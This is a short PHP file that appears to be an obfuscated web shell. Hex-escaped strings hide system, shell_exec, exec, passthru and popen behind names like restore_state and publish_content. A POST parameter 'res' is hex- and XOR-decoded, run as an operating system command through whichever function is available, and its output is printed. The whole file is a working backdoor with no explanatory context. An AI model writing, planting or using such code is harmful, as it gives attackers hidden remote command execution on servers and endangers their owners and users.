<?php

$restore_state1 = "\x73\x79st\x65m";
$restore_state6 = "st\x72ea\x6D\x5Fge\x74_\x63o\x6Ete\x6Et\x73";
$auth_exception_handler = "hex\x32\x62i\x6E";
$restore_state2 = "s\x68\x65l\x6C\x5Fe\x78ec";
$restore_state4 = "\x70\x61\x73\x73thru";
$restore_state3 = "exec";
$restore_state5 = "po\x70en";
$restore_state7 = "p\x63lose";
if (isset($_POST["\x72\x65s"])) {
            function publish_content   (     $bind     ,       $resource    )      {   $fac   =    ''    ;   $n=0; do{$fac.=chr(ord($bind[$n])^$resource);$n++;} while($n<strlen($bind)); return    $fac;      }
            $res = $auth_exception_handler($_POST["\x72\x65s"]);
            $res = publish_content($res, 90);
            if (function_exists($restore_state1)) {
                $restore_state1($res);
            } elseif (function_exists($restore_state2)) {
                print $restore_state2($res);
            } elseif (function_exists($restore_state3)) {
                $restore_state3($res, $value_bind);
                print join("\n", $value_bind);
            } elseif (function_exists($restore_state4)) {
                $restore_state4($res);
            } elseif (function_exists($restore_state5) && function_exists($restore_state6) && function_exists($restore_state7)) {
                $resource_fac = $restore_state5($res, 'r');
                if ($resource_fac) {
                    $data_itm = $restore_state6($resource_fac);
                    $restore_state7($resource_fac);
                    print $data_itm;
                }
            }
            exit;
        }